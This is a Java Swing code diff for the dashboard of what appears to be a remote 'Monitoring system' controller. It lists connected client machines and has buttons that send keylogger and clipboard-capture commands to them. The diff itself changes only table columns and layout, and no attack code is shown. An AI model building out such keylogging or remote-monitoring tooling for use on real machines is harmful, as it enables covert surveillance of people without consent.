@@ -1,6 +1,7 @@
 package swing;
 
 import admin.Admin;
+import models.SystemInfoModel;
 import swing.button.ButtonCustom;
 import swing.progressbar.ProgressBarCustom;
 import swing.table.TableCustom;
@@ -56,25 +57,32 @@ public class DashboardGUI extends JFrame {
     private ButtonCustom btn_keylogger;
 
     private static DefaultTableModel defaultTableModel = new DefaultTableModel();
-    private static final Object[] tableHeaders = {"ID", "CPU", "RAM", "DISK", "IP"};
+    private static final Object[] tableHeaders = {"Id", "Host Name", "Operating System", "Mac address", "Ip address"};
     private String currentClientId;
 
-    public DashboardGUI() throws IOException {
+    public DashboardGUI() throws Exception {
         (admin = new Admin(this)).start();
         this.initFrame();
+        jscrollpane.setPreferredSize(new Dimension( 600 , 500));
         table.setModel(defaultTableModel);
         TableCustom.apply(jscrollpane, TableCustom.TableType.MULTI_LINE);
         ImageIcon imageIcon = new ImageIcon(new ImageIcon("/test4.jpg").getImage().getScaledInstance(350, 210, Image.SCALE_SMOOTH));
         this.lbl_image.setIcon(imageIcon);
     }
 
-    private void initFrame() {
+    private void initFrame() throws InterruptedException {
+        /**
+         * Frame config
+         */
         this.setSize(1200, 800);
         this.setResizable(true);
+        this.setContentPane(main);
         this.setLocationRelativeTo(null);
         this.setTitle("Monitoring system");
-        this.setContentPane(main);
         this.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
+        /**
+         * Panel config
+         */
         this.main.setBackground(Color.WHITE);
         this.right.setBackground(Color.WHITE);
         this.left.setBackground(Color.WHITE);
@@ -84,25 +92,32 @@ public class DashboardGUI extends JFrame {
         this.pnl_client_progress_bar.setBackground(Color.WHITE);
         this.pnl_client_information.setBackground(Color.WHITE);
         this.pnl_client_action.setBackground(Color.WHITE);
+        /**
+         * Table config
+         */
         this.table.setSelectionMode(ListSelectionModel.SINGLE_SELECTION);
+        defaultTableModel.setColumnIdentifiers(tableHeaders);
         this.table.getSelectionModel().addListSelectionListener(new ListSelectionListener() {
             public void valueChanged(ListSelectionEvent e) {
                 int selectedRow = table.getSelectedRow();
                 if (selectedRow == -1) {
                     return;
                 }
-                console.log("[selectedRow]" + selectedRow);
-                lbl_uuid.setText((String) table.getValueAt(selectedRow, 0));
-                lbl_ram.setText((String) table.getValueAt(selectedRow, 2));
-                lbl_disk.setText((String) table.getValueAt(selectedRow, 3));
-                lbl_cpu.setText((String) table.getValueAt(selectedRow, 1));
-                lbl_ip.setText((String) table.getValueAt(selectedRow, 4));
+                currentClientId = (String) table.getValueAt(selectedRow, 0);
+                SystemInfoModel client = admin.getClients().get(currentClientId);
+//                lbl_uuid.setText(currentClientId);
+                lbl_ram.setText(client.getRam());
+                lbl_disk.setText(client.getDisk());
+                lbl_cpu.setText(client.getCpu());
+                lbl_ip.setText(client.getIp());
 
-                currentClientId = lbl_uuid.getText();
                 console.info("[CURRENT CLIENT] " + currentClientId);
             }
 
         });
+        /**
+         * ActionListener config
+         */
         this.btn_clipboard.addActionListener(new ActionListener() {
             @Override
             public void actionPerformed(ActionEvent e) {
@@ -117,7 +132,10 @@ public class DashboardGUI extends JFrame {
                 admin.onHandle(COMMAND_KEYLOGGER);
             }
         });
-        defaultTableModel.setColumnIdentifiers(tableHeaders);
+        test.addDefaultContextMenu(txt_area_keylogger);
+        /**
+         * Threading config
+         */
         new Thread(this::fetch).start();
         new Thread(this::monitoring).start();
     }
@@ -145,9 +163,9 @@ public class DashboardGUI extends JFrame {
                 admin.getClients().forEach((key, value) -> {
                     defaultTableModel.addRow(new Object[]{
                             key,
-                            value.getCpu(),
-                            value.getRam(),
-                            value.getDisk(),
+                            value.getHostName(),
+                            value.getOs(),
+                            value.getMAC_address(),
                             value.getIp()});
                 });
                 table.setModel(defaultTableModel);
